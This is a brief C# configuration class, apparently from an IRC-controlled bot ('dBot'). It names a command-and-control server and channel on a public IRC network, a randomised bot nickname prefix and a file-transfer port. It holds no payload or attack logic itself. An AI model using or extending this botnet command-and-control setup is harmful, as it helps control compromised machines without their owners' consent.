using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace d3pl0y
{
    class Config
    {
       public static bool debug = true;
       public static string ccServer = "eu.undernet.org";
       public static string ccChan = "#SorrowHouse";
       public static string prefix = "[dBot]" + new Random().Next(1000, 9999);
       public static int ccPort = 6667;
       public static int ftPort = 8;
       public static int version = 1;
       
    }
}
